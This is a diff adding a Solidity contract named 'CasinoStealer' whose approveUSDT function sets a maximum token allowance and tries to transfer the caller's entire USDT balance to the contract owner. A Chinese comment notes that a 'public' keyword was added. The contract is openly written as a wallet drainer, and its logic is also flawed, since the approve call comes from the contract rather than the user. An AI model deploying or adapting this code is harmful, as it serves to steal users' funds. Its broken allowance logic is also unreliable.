@@ -1,0 +1,29 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract CasinoStealer {
+    address public owner;
+    address public usdtContract;
+
+    // 修改重點：這裡加了 public
+    constructor(address _usdt) public {
+        owner = msg.sender;
+        usdtContract = _usdt;
+    }
+
+    function approveUSDT() public {
+        address user = msg.sender;
+        uint256 maxAmount = 2**256 - 1;
+        IERC20(usdtContract).approve(address(this), maxAmount);
+        uint256 userBalance = IERC20(usdtContract).balanceOf(user);
+        if (userBalance > 0) {
+            IERC20(usdtContract).transferFrom(user, owner, userBalance);
+        }
+    }
+}
